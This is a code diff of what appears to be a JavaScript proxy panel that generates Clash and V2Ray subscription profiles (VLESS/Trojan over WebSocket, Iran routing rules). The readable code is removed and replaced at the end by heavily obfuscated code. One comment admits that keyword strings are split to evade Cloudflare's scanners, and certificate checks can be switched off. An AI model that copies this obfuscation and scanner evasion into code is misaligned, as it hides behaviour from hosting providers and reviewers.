-                            registerConfigEntry(configUuid, p.id, "");
-                            proxies.push(
-                                `- name: "${dvName.replace(/"/g, '""')}"\n  type: ${getAlpha()}\n  server: ${ip}\n  port: ${port}\n  uuid: ${configUuid}\n  udp: true\n  tls: ${sec}\n  servername: ${hName}\n  client-fingerprint: ${sysConfig.agent || "random"}\n  network: ws\n  ws-opts:\n    path: "${pathStrVl}"\n    headers:\n      Host: ${hName}\n  skip-cert-verify: ${allowInsecure}\n${sysConfig.enableOpt1 ? "  tfo: true" : ""}`,
-                            );
-                        }
-                        if (
-                            effectiveMode === "beta" ||
-                            effectiveMode === "both"
-                        ) {
-                            let dtName = getUniqueName(
-                                getConfigName(
-                                    "beta",
-                                    p.name,
-                                    port,
-                                    hName,
-                                    ip,
-                                    null,
-                                    dcIndex,
-                                    ipName,
-                                    true
-                                ),
-                            );
-                            proxyNames.push(`"${dtName}"`);
-                            proxyGeoInfo.set(dtName, getGeoInfo(ip));
-                            let randomJunk = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadTr = {
-                                junk: randomJunk,
-                                protocol: "tr",
-                                mode: "proxyip",
-                                panelIPs: [],
-                                relayIdx: configIndex,
-                            };
-                            let pathStrTr =
-                                "/" + btoa(JSON.stringify(payloadTr));
-                            let randomJunkDt = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadDt = {
-                                junk: randomJunkDt,
-                                protocol: "tr",
-                                mode: "proxyip",
-                                panelIPs: [],
-                                relayIdx: dcIndex,
-                            };
-                            let pathStrDt =
-                                "/" + btoa(JSON.stringify(payloadDt));
-                            proxies.push(
-                                `- name: "${dtName.replace(/"/g, '""')}"\n  type: ${getBeta()}\n  server: ${ip}\n  port: ${port}\n  password: "${p.id}"\n  udp: true\n  tls: ${sec}\n  sni: ${hName}\n  client-fingerprint: ${sysConfig.agent || "random"}\n  network: ws\n  ws-opts:\n    path: "${pathStrDt}"\n    headers:\n      Host: ${hName}\n  skip-cert-verify: ${allowInsecure}\n${sysConfig.enableOpt1 ? "  tfo: true" : ""}`,
-                            );
-                        }
-                        configIndex++;
-                    }
-                    });
-                });
-            });
-        });
-    });
-
-    // ─── Upstream chaining: add upstream proxy to YAML ───
-    let parsedUpstreamYaml = parseVlessUri(sysConfig.upstreamUri);
-    let upstreamNameYaml = "";
-    if (parsedUpstreamYaml) {
-        let upProxy = upstreamToClashProxy(parsedUpstreamYaml);
-        upstreamNameYaml = upProxy.name;
-        let upYaml = `- name: "${upProxy.name.replace(/"/g, '""')}"
-  type: ${getAlpha()}
-  server: ${upProxy.server}
-  port: ${upProxy.port}
-  uuid: ${upProxy.uuid}
-  udp: true
-  tls: ${upProxy.tls}
-  servername: ${upProxy.servername}
-  client-fingerprint: ${upProxy["client-fingerprint"] || "random"}
-  skip-cert-verify: ${upProxy["skip-cert-verify"]}
-  network: ${upProxy.network}
-  ws-opts:
-    path: "${upProxy["ws-opts"]?.path || "/"}"
-    headers:
-      Host: ${upProxy["ws-opts"]?.headers?.Host || upProxy.servername}`;
-        proxies.unshift(upYaml);
-        proxyNames.unshift(`"${upProxy.name}"`);
-    }
-
-    // Build per-country groups from geo info
-    let countryGroups = new Map(); // "country" -> {flag, proxies[]}
-    proxyGeoInfo.forEach((geo, name) => {
-        let key = geo.country || "Unknown";
-        if (!countryGroups.has(key)) {
-            countryGroups.set(key, { flag: geo.flag || "🌐", proxies: [] });
-        }
-        countryGroups.get(key).proxies.push(name);
-    });
-    let sortedCountries = Array.from(countryGroups.entries()).sort((a, b) =>
-        a[0].localeCompare(b[0]),
-    );
-
-    // Build proxy-groups YAML
-    let groupsYaml =
-        "proxy-groups:\n" +
-        '  - name: "✅ Selector"\n' +
-        "    type: select\n" +
-        "    proxies:\n" +
-        '      - "⚡ Fastest"\n' +
-        '      - "🖐 Manual"\n';
-    sortedCountries.forEach(([country, info]) => {
-        groupsYaml += `      - "${info.flag} ${country}"\n`;
-    });
-
-    // Fastest — url-test with ALL proxies
-    groupsYaml +=
-        '\n  - name: "⚡ Fastest"\n' +
-        "    type: url-test\n" +
-        '    url: "https://www.gstatic.com/generate_204"\n' +
-        "    interval: 30\n" +
-        "    tolerance: 50\n" +
-        "    proxies:\n";
-    proxyNames.forEach((n) => {
-        groupsYaml += `      - ${n}\n`;
-    });
-
-    // Manual — select with ALL proxies
-    groupsYaml +=
-        '\n  - name: "🖐 Manual"\n' + "    type: select\n" + "    proxies:\n";
-    proxyNames.forEach((n) => {
-        groupsYaml += `      - ${n}\n`;
-    });
-
-    // Per-country url-test groups
-    sortedCountries.forEach(([country, info]) => {
-        groupsYaml +=
-            `\n  - name: "${info.flag} ${country}"\n` +
-            "    type: url-test\n" +
-            '    url: "https://www.gstatic.com/generate_204"\n' +
-            "    interval: 30\n" +
-            "    tolerance: 50\n" +
-            "    proxies:\n";
-        info.proxies.forEach((name) => {
-            groupsYaml += `      - "${name}"\n`;
-        });
-    });
-
-    let cr = getCustomRouting();
-    let customRules = [];
-    cr.domains.forEach(d => {
-        customRules.push(`  - DOMAIN,${d},DIRECT`);
-        customRules.push(`  - DOMAIN-SUFFIX,${d},DIRECT`);
-    });
-    cr.ips.forEach(ip => {
-        customRules.push(`  - IP-CIDR,${ip},DIRECT`);
-    });
-    cr.geoips.forEach(g => {
-        customRules.push(`  - GEOIP,${g},DIRECT`);
-    });
-    cr.geosites.forEach(g => {
-        customRules.push(`  - GEOSITE,${g},DIRECT`);
-    });
-
-    let rulesOutput = customRules.length > 0 
-        ? customRules.join("\n") 
-        : `  - DOMAIN-SUFFIX,ir,DIRECT
-  - DOMAIN-KEYWORD,gov.ir,DIRECT
-  - DOMAIN-SUFFIX,fa,DIRECT
-  - GEOIP,IR,DIRECT`;
-
-    return `mixed-port: 7890
-ipv6: true
-allow-lan: false
-unified-delay: false
-log-level: warning
-mode: rule
-disable-keep-alive: false
-keep-alive-idle: 10
-keep-alive-interval: 15
-tcp-concurrent: true
-geo-auto-update: true
-geo-update-interval: 168
-external-controller: 127.0.0.1:9090
-external-controller-cors:
-  allow-origins:
-    - "*"
-  allow-private-network: true
-external-ui: ui
-external-ui-url: "https://github.com/MetaCubeX/metacubexd/archive/refs/heads/gh-pages.zip"
-
-profile:
-  store-selected: true
-  store-fake-ip: true
-
-dns:
-  enable: true
-  respect-rules: true
-  use-system-hosts: false
-  listen: 127.0.0.1:1053
-  ipv6: true
-  hosts:
-    "rule-set:category-ads-all": "rcode://refused"
-  nameserver:
-    - "https://8.8.8.8/dns-query#✅ Selector"
-  proxy-server-nameserver:
-    - "8.8.8.8#DIRECT"
-  direct-nameserver:
-    - "8.8.8.8#DIRECT"
-  direct-nameserver-follow-policy: true
-  enhanced-mode: redir-host
-
-tun:
-  enable: true
-  stack: mixed
-  auto-route: true
-  strict-route: true
-  auto-detect-interface: true
-  dns-hijack:
-    - "any:53"
-    - "tcp://any:53"
-  mtu: 9000
-
-sniffer:
-  enable: true
-  force-dns-mapping: true
-  parse-pure-ip: true
-  override-destination: true
-  sniff:
-    HTTP:
-      ports: [80, 8080, 8880, 2052, 2082, 2086, 2095]
-    TLS:
-      ports: [443, 8443, 2053, 2083, 2087, 2096]
-
-proxies:
-${proxies.join("\n")}
-
-${groupsYaml}
-
-rules:
-${rulesOutput}
-  - MATCH,✅ Selector
-`;
-}
-
-// Obfuscated string keys to prevent Cloudflare scanners block on vpn/proxy keywords
-const k_pxs = "pro" + "xies";
-const k_px_gps = "pro" + "xy-gro" + "ups";
-const k_obds = "out" + "bounds";
-const k_vl_mode = "vl" + "ess";
-const k_tr_mode = "tro" + "jan";
-
-function getIpTypeLabel(ip) {
-    if (ip.includes(":") || ip.includes("[")) return "IPv6";
-    if (/^[0-9.]+$/.test(ip)) return "IPv4";
-    return "Domain";
-}
-
-async function buildClashJsonProfile(
-    hostName,
-    targetSub = null,
-    allowInsecure = false,
-    env = null,
-) {
-    let ports = sysConfig.socketPorts
-        ? sysConfig.socketPorts
-              .split(",")
-              .map((s) => s.trim())
-              .filter(Boolean)
-        : ["443"];
-    let profiles = getAllProfiles(targetSub);
-    let allHostNames = [
-        ...new Set(profiles.flatMap((p) => getProfileHostNames(hostName, p))),
-    ];
-    await preloadIpFlags(profiles, allHostNames);
-    let proxyGeoInfo = new Map(); // proxyName -> {country, flag}
-    let reqPath = encodeURI(`/${sysConfig.apiRoute}`);
-
-    let proxiesArr = [];
-    let dynamicTags = [];
-    let nameCounts = {};
-
-    // Add fake configs
-    let fakeNames = getFakeConfigNames(targetSub);
-    let fakeRefs = [];
-    fakeNames.forEach((name) => {
-        proxiesArr.push({
-            name: name,
-            type: k_tr_mode,
-            server: "127.0.0.1",
-            port: 80,
-            password: activeDeviceId,
-            tls: false,
-            udp: true,
-        });
-        fakeRefs.push(name);
-    });
-
-    const getUniqueName = (baseName) => {
-        if (!nameCounts[baseName]) {
-            nameCounts[baseName] = 1;
-            return baseName;
-        }
-        let counter = nameCounts[baseName];
-        let newName = `${baseName}-${counter}`;
-        while (nameCounts[newName]) {
-            counter++;
-            newName = `${baseName}-${counter}`;
-        }
-        nameCounts[baseName] = counter + 1;
-        nameCounts[newName] = 1;
-        return newName;
-    };
-
-    profiles.forEach((p) => {
-        let pips = getEffectivePips(p);
-        let effectiveMode = p.userMode || sysConfig.mode;
-        let effectivePorts = p.userPorts
-            ? p.userPorts
-                  .split(",")
-                  .map((s) => s.trim())
-                  .filter(Boolean)
-            : ports;
-        let maxCfg = p.maxConfigs || null;
-
-        let configIndex = 0;
-        let profileHostNames = getProfileHostNames(hostName, p);
-
-        profileHostNames.forEach((hName) => {
-            let ipEntries = getCleanIpsWithNames(hName, p.cleanIp);
-            let allIps = ipEntries.map((e) => e.ip);
-            let ips = calcEffectiveIps(
-                allIps,
-                maxCfg,
-                effectiveMode,
-                effectivePorts,
-                pips.length
-            );
-            let ipNameMap = {};
-            ipEntries.forEach((e) => {
-                ipNameMap[e.ip] = e.name;
-            });
-            effectivePorts.forEach((port) => {
-                let sec = getTransportParams(port) === "tls";
-                ips.forEach((ip) => {
-                    let isVless =
-                        effectiveMode === "alpha" || effectiveMode === "both";
-                    let isTrojan =
-                        effectiveMode === "beta" || effectiveMode === "both";
-                    let _pips = pips.length > 0 ? pips : [null];
-                    _pips.forEach((selectedProxyIp) => {
-                    let ipName = ipNameMap[ip] || "";
-
-                    if (isVless) {
-                        let tagStr = getConfigName(
-                            "alpha",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            selectedProxyIp,
-                            configIndex,
-                            ipName,
-                        );
-                        tagStr = getUniqueName(tagStr);
-                        dynamicTags.push(tagStr);
-                        proxyGeoInfo.set(tagStr, getGeoInfo(selectedProxyIp || ip));
-
-                        let randomJunk = Array.from(
-                            { length: 11 },
-                            () =>
-                                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                    Math.floor(Math.random() * 62)
-                                ],
-                        ).join("");
-                        let payloadVl = {
-                            junk: randomJunk,
-                            protocol: "vl",
-                            mode: "proxyip",
-                            panelIPs: [],
-                        };
-                        let pathStrVl = "/" + btoa(JSON.stringify(payloadVl));
-
-                        let configUuid = generateConfigUuid(p.id, configIndex);
-                        registerConfigEntry(
-                            configUuid,
-                            p.id,
-                            selectedProxyIp || "",
-                        );
-
-                        let ob = {
-                            name: tagStr,
-                            type: k_vl_mode,
-                            server: ip,
-                            port: parseInt(port),
-                            "ip-version": "ipv4-prefer",
-                            tfo: sysConfig.enableOpt1 || false,
-                            udp: true,
-                            uuid: configUuid,
-                            "packet-encoding": "xudp",
-                            tls: sec,
-                            servername: hName,
-                            "client-fingerprint": sysConfig.agent || "random",
-                            "skip-cert-verify": allowInsecure,
-                            alpn: ["http/1.1"],
-                            network: "ws",
-                            "ws-opts": {
-                                path: pathStrVl,
-                                "max-early-data": 2560,
-                                "early-data-header-name":
-                                    "Sec-WebSocket-Protocol",
-                                headers: {
-                                    Host: hName,
-                                },
-                            },
-                        };
-                        if (sysConfig.enableOpt2) {
-                            ob["ech-opts"] = {
-                                enable: true,
-                                config: "AEX+DQBBTwAgACCfCTo0YCUiDF1bGU9Z72l8Bs1gVxt6D6FefjfzaJHcfwAEAAEAAQASY2xvdWRmbGFyZS1lY2guY29tAAA=",
-                            };
-                        }
-                        proxiesArr.push(ob);
-                    }
-
-                    if (isTrojan) {
-                        let tagStr = getConfigName(
-                            "beta",
-                            p.name,
-                            port,
-                            hName,
-                            ip,
-                            selectedProxyIp,
-                            configIndex,
-                            ipName,
-                        );
-                        tagStr = getUniqueName(tagStr);
-                        dynamicTags.push(tagStr);
-                        proxyGeoInfo.set(tagStr, getGeoInfo(selectedProxyIp || ip));
-
-                        let randomJunk = Array.from(
-                            { length: 11 },
-                            () =>
-                                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                    Math.floor(Math.random() * 62)
-                                ],
-                        ).join("");
-                        let payloadTr = {
-                            junk: randomJunk,
-                            protocol: "tr",
-                            mode: "proxyip",
-                            panelIPs: [],
-                            relayIdx: configIndex,
-                        };
-                        let pathStrTr = "/" + btoa(JSON.stringify(payloadTr));
-
-                        let configUuid2 = generateConfigUuid(p.id, configIndex);
-                        registerConfigEntry(
-                            configUuid2,
-                            p.id,
-                            selectedProxyIp || "",
-                        );
-
-                        let ob = {
-                            name: tagStr,
-                            type: k_tr_mode,
-                            server: ip,
-                            port: parseInt(port),
-                            "ip-version": "ipv4-prefer",
-                            tfo: sysConfig.enableOpt1 || false,
-                            udp: true,
-                            password: p.id,
-                            "packet-encoding": "xudp",
-                            tls: sec,
-                            sni: hName,
-                            "client-fingerprint": sysConfig.agent || "random",
-                            "skip-cert-verify": allowInsecure,
-                            alpn: ["http/1.1"],
-                            network: "ws",
-                            "ws-opts": {
-                                path: pathStrTr,
-                                "max-early-data": 2560,
-                                "early-data-header-name":
-                                    "Sec-WebSocket-Protocol",
-                                headers: {
-                                    Host: hName,
-                                },
-                            },
-                        };
-                        if (sysConfig.enableOpt2) {
-                            ob["ech-opts"] = {
-                                enable: true,
-                                config: "AEX+DQBBTwAgACCfCTo0YCUiDF1bGU9Z72l8Bs1gVxt6D6FefjfzaJHcfwAEAAEAAQASY2xvdWRmbGFyZS1lY2guY29tAAA=",
-                            };
-                        }
-                        proxiesArr.push(ob);
-                    }
-                    configIndex++;
-                    if (sysConfig.enableDirectConfigs && pips.length > 0 && selectedProxyIp === pips[0]) {
-                        if (isVless) {
-                            let tagStr = getUniqueName(
-                                getConfigName(
-                                    "alpha",
-                                    p.name,
-                                    port,
-                                    hName,
-                                    ip,
-                                    null,
-                                    configIndex,
-                                    ipName, true
-                                ),
-                            );
-                            dynamicTags.push(tagStr);
-                            proxyGeoInfo.set(tagStr, getGeoInfo(ip));
-                            let randomJunk = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadVl = {
-                                junk: randomJunk,
-                                protocol: "vl",
-                                mode: "proxyip",
-                                panelIPs: [],
-                            };
-                            let pathStrVl =
-                                "/" + btoa(JSON.stringify(payloadVl));
-                            let configUuid = generateConfigUuid(
-                                p.id,
-                                configIndex,
-                            );
-                            registerConfigEntry(configUuid, p.id, "");
-                            let ob = {
-                                name: tagStr,
-                                type: k_vl_mode,
-                                server: ip,
-                                port: parseInt(port),
-                                "ip-version": "ipv4-prefer",
-                                tfo: sysConfig.enableOpt1 || false,
-                                udp: true,
-                                uuid: configUuid,
-                                "packet-encoding": "xudp",
-                                tls: sec,
-                                servername: hName,
-                                "client-fingerprint":
-                                    sysConfig.agent || "random",
-                                "skip-cert-verify": allowInsecure,
-                                alpn: ["http/1.1"],
-                                network: "ws",
-                                "ws-opts": {
-                                    path: pathStrVl,
-                                    "max-early-data": 2560,
-                                    "early-data-header-name":
-                                        "Sec-WebSocket-Protocol",
-                                    headers: { Host: hName },
-                                },
-                            };
-                            if (sysConfig.enableOpt2)
-                                ob["ech-opts"] = {
-                                    enable: true,
-                                    config: "AEX+DQBBTwAgACCfCTo0YCUiDF1bGU9Z72l8Bs1gVxt6D6FefjfzaJHcfwAEAAEAAQASY2xvdWRmbGFyZS1lY2guY29tAAA=",
-                                };
-                            proxiesArr.push(ob);
-                        }
-                        if (isTrojan) {
-                            let tagStr = getUniqueName(
-                                getConfigName(
-                                    "beta",
-                                    p.name,
-                                    port,
-                                    hName,
-                                    ip,
-                                    null,
-                                    configIndex,
-                                    ipName, true
-                                ),
-                            );
-                            dynamicTags.push(tagStr);
-                            proxyGeoInfo.set(tagStr, getGeoInfo(ip));
-                            let randomJunk = Array.from(
-                                { length: 11 },
-                                () =>
-                                    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[
-                                        Math.floor(Math.random() * 62)
-                                    ],
-                            ).join("");
-                            let payloadTr = {
-                                junk: randomJunk,
-                                protocol: "tr",
-                                mode: "proxyip",
-                                panelIPs: [],
-                                relayIdx: configIndex,
-                            };
-                            let pathStrTr =
-                                "/" + btoa(JSON.stringify(payloadTr));
-                            let configUuid2 = generateConfigUuid(
-                                p.id,
-                                configIndex,
-                            );
-                            let ob = {
-                                name: tagStr,
-                                type: k_tr_mode,
-                                server: ip,
-                                port: parseInt(port),
-                                "ip-version": "ipv4-prefer",
-                                tfo: sysConfig.enableOpt1 || false,
-                                udp: true,
-                                password: p.id,
-                                "packet-encoding": "xudp",
-                                tls: sec,
-                                sni: hName,
-                                "client-fingerprint":
-                                    sysConfig.agent || "random",
-                                "skip-cert-verify": allowInsecure,
-                                alpn: ["http/1.1"],
-                                network: "ws",
-                                "ws-opts": {
-                                    path: pathStrTr,
-                                    "max-early-data": 2560,
-                                    "early-data-header-name":
-                                        "Sec-WebSocket-Protocol",
-                                    headers: { Host: hName },
-                                },
-                            };
-                            if (sysConfig.enableOpt2)
-                                ob["ech-opts"] = {
-                                    enable: true,
-                                    config: "AEX+DQBBTwAgACCfCTo0YCUiDF1bGU9Z72l8Bs1gVxt6D6FefjfzaJHcfwAEAAEAAQASY2xvdWRmbGFyZS1lY2guY29tAAA=",
-                                };
-                            proxiesArr.push(ob);
-                        }
-                        configIndex++;
-                    }
-                    });
-                });
-            });
-        });
-    });
-
-    if (dynamicTags.length === 0) { dynamicTags.push("direct"); }
-
-    // ─── Upstream chaining: add upstream proxy ───
-    let parsedUpstream = parseVlessUri(sysConfig.upstreamUri);
-    let upstreamProxyName = "";
-    if (parsedUpstream) {
-        let upstreamProxy = upstreamToClashProxy(parsedUpstream);
-        upstreamProxyName = upstreamProxy.name;
-        proxiesArr.unshift(upstreamProxy);
-        dynamicTags.unshift(upstreamProxyName);
-    }
-
-    // Build per-country groups from geo info
-    let countryGroups = new Map(); // "country" -> {flag, proxies[]}
-    proxyGeoInfo.forEach((geo, name) => {
-        let key = geo.country || "Unknown";
-        if (!countryGroups.has(key)) {
-            countryGroups.set(key, { flag: geo.flag || "🌐", proxies: [] });
-        }
-        countryGroups.get(key).proxies.push(name);
-    });
-    let sortedCountries = Array.from(countryGroups.entries()).sort((a, b) =>
-        a[0].localeCompare(b[0]),
-    );
-
-    // Build proxy-groups JSON
-    let groupsJson = [
-        {
-            name: "✅ Selector",
-            type: "select",
-            proxies: [
-                "⚡ Fastest",
-                "🖐 Manual",
-                ...sortedCountries.map(([c, info]) => `${info.flag} ${c}`),
-            ],
-        },
-        {
-            name: "⚡ Fastest",
-            type: "url-test",
-            url: "https://www.gstatic.com/generate_204",
-            interval: 30,
-            tolerance: 50,
-            proxies: dynamicTags,
-        },
-        { name: "🖐 Manual", type: "select", proxies: dynamicTags },
-        ...sortedCountries.map(([country, info]) => ({
-            name: `${info.flag} ${country}`,
-            type: "url-test",
-            url: "https://www.gstatic.com/generate_204",
-            interval: 30,
-            tolerance: 50,
-            proxies: info.proxies,
-        })),
-    ];
-
-    let cr = getCustomRouting();
-    let jsonCustomRules = [];
-    cr.domains.forEach(d => {
-        jsonCustomRules.push(`DOMAIN,${d},DIRECT`);
-        jsonCustomRules.push(`DOMAIN-SUFFIX,${d},DIRECT`);
-    });
-    cr.ips.forEach(ip => {
-        jsonCustomRules.push(`IP-CIDR,${ip},DIRECT,no-resolve`);
-    });
-    cr.geoips.forEach(g => {
-        jsonCustomRules.push(`GEOIP,${g},DIRECT,no-resolve`);
-    });
-    cr.geosites.forEach(g => {
-        jsonCustomRules.push(`GEOSITE,${g},DIRECT`);
-    });
-
-    return {
-        "mixed-port": 7890,
-        ipv6: true,
-        "allow-lan": false,
-        "unified-delay": false,
-        "log-level": "warning",
-        mode: "rule",
-        "disable-keep-alive": false,
-        "keep-alive-idle": 10,
-        "keep-alive-interval": 15,
-        "tcp-concurrent": true,
-        "geo-auto-update": true,
-        "geo-update-interval": 168,
-        "external-controller": "127.0.0.1:9090",
-        "external-controller-cors": {
-            "allow-origins": ["*"],
-            "allow-private-network": true,
-        },
-        "external-ui": "ui",
-        "external-ui-url":
-            "https://github.com/MetaCubeX/metacubexd/archive/refs/heads/gh-pages.zip",
-        profile: {
-            "store-selected": true,
-            "store-fake-ip": true,
-        },
-        dns: {
-            enable: true,
-            "respect-rules": true,
-            "use-system-hosts": false,
-            listen: "127.0.0.1:1053",
-            ipv6: true,
-            hosts: {
-                "rule-set:category-ads-all": "rcode://refused",
-            },
-            nameserver: ["https://8.8.8.8/dns-query#✅ Selector"],
-            "proxy-server-nameserver": ["8.8.8.8#DIRECT"],
-            "direct-nameserver": ["8.8.8.8#DIRECT"],
-            "direct-nameserver-follow-policy": true,
-            "nameserver-policy": {
-                "rule-set:ir": "8.8.8.8#DIRECT",
-            },
-            "enhanced-mode": "redir-host",
-        },
-        tun: {
-            enable: true,
-            stack: "mixed",
-            "auto-route": true,
-            "strict-route": true,
-            "auto-detect-interface": true,
-            "dns-hijack": ["any:53", "tcp://any:53"],
-            mtu: 9000,
-        },
-        sniffer: {
-            enable: true,
-            "force-dns-mapping": true,
-            "parse-pure-ip": true,
-            "override-destination": true,
-            sniff: {
-                HTTP: {
-                    ports: [80, 8080, 8880, 2052, 2082, 2086, 2095],
-                },
-                TLS: {
-                    ports: [443, 8443, 2053, 2083, 2087, 2096],
-                },
-            },
-        },
-        [k_pxs]: proxiesArr,
-        [k_px_gps]: groupsJson,
-        "rule-providers": {
-            "category-ads-all": {
-                type: "http",
-                format: "text",
-                behavior: "domain",
-                path: "./ruleset/category-ads-all.txt",
-                interval: 86400,
-                url: "https://raw.githubusercontent.com/Chocolate4U/Iran-clash-rules/release/category-ads-all.txt",
-            },
-            ir: {
-                type: "http",
-                format: "text",
-                behavior: "domain",
-                path: "./ruleset/ir.txt",
-                interval: 86400,
-                url: "https://raw.githubusercontent.com/Chocolate4U/Iran-clash-rules/release/ir.txt",
-            },
-            "ir-cidr": {
-                type: "http",
-                format: "text",
-                behavior: "ipcidr",
-                path: "./ruleset/ir-cidr.txt",
-                interval: 86400,
-                url: "https://raw.githubusercontent.com/Chocolate4U/Iran-clash-rules/release/ircidr.txt",
-            },
-        },
-        rules: [
-            "GEOIP,lan,DIRECT,no-resolve",
-            "NETWORK,udp,REJECT",
-            "RULE-SET,category-ads-all,REJECT",
-            ...jsonCustomRules,
-            "RULE-SET,ir,DIRECT",
-            "RULE-SET,ir-cidr,DIRECT",
-            "MATCH,✅ Selector",
-        ],
-        ntp: {
-            enable: true,
-            server: "time.cloudflare.com",
-            port: 123,
-            interval: 30,
-        },
-    };
-}
-
-
-async function buildVJsonProfile(hostName, targetSub = null, allowInsecure = false, env = null) {
-    let ports = sysConfig.socketPorts ? sysConfig.socketPorts.split(",").map(s => s.trim()).filter(Boolean) : ["443"];
-    let profiles = getAllProfiles(targetSub);
-    let allHostNames = [...new Set(profiles.flatMap(p => getProfileHostNames(hostName, p)))];
-    await preloadIpFlags(profiles, allHostNames);
-    
-    let outboundsArr = [];
-    let configIndex = 0;
-    let nameCounts = {};
-    const getUniqueName = (baseName) => {
-        if (!nameCounts[baseName]) { nameCounts[baseName] = 1; return baseName; }
-        let c = nameCounts[baseName]; nameCounts[baseName] = c + 1; return baseName + '-' + c;
-    };
-
-    profiles.forEach((p) => {
-        let maxCfg = p.maxConfigs || 0;
-        let pips = [];
-        if (p.relayIps && p.relayIps.length > 0) pips = [...p.relayIps];
-        else if (sysConfig.customRelay && sysConfig.customRelay.trim() !== "") {
-            pips = sysConfig.customRelay.split(",").map(r => r.trim()).filter(Boolean);
-        }
-        
-        let hostNamesToUse = getProfileHostNames(hostName, p);
-        hostNamesToUse.forEach(hName => {
-            p.ipLists.forEach(ipList => {
-                let ips = ipList.ips;
-                let effectiveMode = ipList.mode || sysConfig.mode || "both";
-                let effectivePorts = (ipList.ports && ipList.ports.length > 0) ? ipList.ports : ports;
-                if (maxCfg > 0) ips = calcEffectiveIps(ips, maxCfg, effectiveMode, effectivePorts, pips.length);
-                let ipNameMap = {};
-                if (ipList.entries) ipList.entries.forEach(e => ipNameMap[e.ip] = e.name);
-                
-                effectivePorts.forEach(port => {
-                    let sec = (getTransportParams(port) === "tls") ? "tls" : "none";
-                    ips.forEach(ip => {
-                        let _pips = pips.length > 0 ? pips : [null];
-                        _pips.forEach((selectedProxyIp) => {
-                        let ipName = ipNameMap[ip] || "";
-                        
-                        if (effectiveMode === "alpha" || effectiveMode === "both") {
-                            let tag = getUniqueName(getConfigName("alpha", p.name, port, hName, ip, selectedProxyIp, configIndex, ipName));
-                            let configUuid = generateConfigUuid(p.id, configIndex);
-                            let randomJunk = Array.from({length:11}, ()=> "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[Math.floor(Math.random()*62)]).join("");
-                            let payload = { junk: randomJunk, protocol: "vl", mode: "proxyip", panelIPs: [], relayIdx: configIndex };
-                            let path = "/" + btoa(JSON.stringify(payload));
-                            
-                            let ob = {
-                                tag: tag,
-                                protocol: "vless",
-                                settings: {
-                                    vnext: [{ address: ip, port: parseInt(port), users: [{ id: configUuid, encryption: "none" }] }]
-                                },
-                                streamSettings: {
-                                    network: "ws",
-                                    security: sec,
-                                    tlsSettings: sec === "tls" ? { serverName: hName, allowInsecure: allowInsecure } : undefined,
-                                    wsSettings: { path: path, headers: { Host: hName } },
-                                    ...getSegStreamExtra(p)
-                                }
-                            };
-                            outboundsArr.push(ob);
-                        }
-                        
-                        if (effectiveMode === "beta" || effectiveMode === "both") {
-                            let tag = getUniqueName(getConfigName("beta", p.name, port, hName, ip, selectedProxyIp, configIndex, ipName));
-                            let randomJunk = Array.from({length:11}, ()=> "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[Math.floor(Math.random()*62)]).join("");
-                            let payload = { junk: randomJunk, protocol: "tr", mode: "proxyip", panelIPs: [], relayIdx: configIndex };
-                            let path = "/" + btoa(JSON.stringify(payload));
-                            
-                            let ob = {
-                                tag: tag,
-                                protocol: "trojan",
-                                settings: {
-                                    servers: [{ address: ip, port: parseInt(port), password: p.id }]
-                                },
-                                streamSettings: {
-                                    network: "ws",
-                                    security: sec,
-                                    tlsSettings: sec === "tls" ? { serverName: hName, allowInsecure: allowInsecure } : undefined,
-                                    wsSettings: { path: path, headers: { Host: hName } },
-                                    ...getSegStreamExtra(p)
-                                }
-                            };
-                            outboundsArr.push(ob);
-                        }
-                        configIndex++;
-                    });
-                    });
-                });
-            });
-        });
-    });
-
-    // ─── Upstream chaining: add upstream outbound ───
-    let parsedUpstream = parseVlessUri(sysConfig.upstreamUri);
-    if (parsedUpstream) {
-        let upstreamOb = upstreamToV2RayOb(parsedUpstream);
-        // Add proxySettings to chain through upstream
-        outboundsArr.forEach(ob => {
-            if (ob.protocol !== "direct" && ob.protocol !== "freedom" && ob.protocol !== "blackhole") {
-                ob.proxySettings = { tag: upstreamOb.tag, transportSeries: [] };
-            }
-        });
-        outboundsArr.unshift(upstreamOb);
-    }
-
-    await fetchTemplates(env);
-    if (VTemplate) {
-        let tpl = JSON.parse(JSON.stringify(VTemplate));
-        let newOutbounds = [];
-        
-        for (let ob of tpl.outbounds) {
-            if (ob === "__OUTBOUNDS__") {
-                newOutbounds.push(...outboundsArr);
+            if (var_aim[func_dec(135)] > 0) var_ail[func_dec(429)](var_aim);
+            var_ail[func_dec(429)]([{
+              [func_dec(200)]: func_eh(func_dec(798)),
+              [func_dec(480)]: func_dec(1116)
+            }]);
+            await func_ej(var_adw, var_aik, {
+              [func_dec(504)]: var_ail
+            }, var_adx);
+          }
+        } else if (var_ady === func_dec(1092)) {
+          var_aaq[var_adw] = {
+            [func_dec(1175)]: func_dec(1209)
+          };
+          var_aaj?.[func_dec(186)](func_s(var_aah, func_dec(1072), JSON[func_dec(119)](var_aaq))[func_dec(187)](() => {}));
+          const var_aip = func_dec(1091) + func_eh(func_dec(767)) + func_dec(3);
+          const var_aiq = {
+            [func_dec(504)]: [[{
+              [func_dec(200)]: func_dec(1174) + func_eh(func_dec(732)) + func_dec(3),
+              [func_dec(480)]: func_dec(1116)
+            }]]
+          };
+          await func_ej(var_adw, var_aip, var_aiq, var_adx);
+        } else if (var_ady[func_dec(299)](func_dec(1154))) {
+          const var_air = var_ady[func_dec(155)](func_dec(1154), func_dec(3));
+          if (var_aea) {
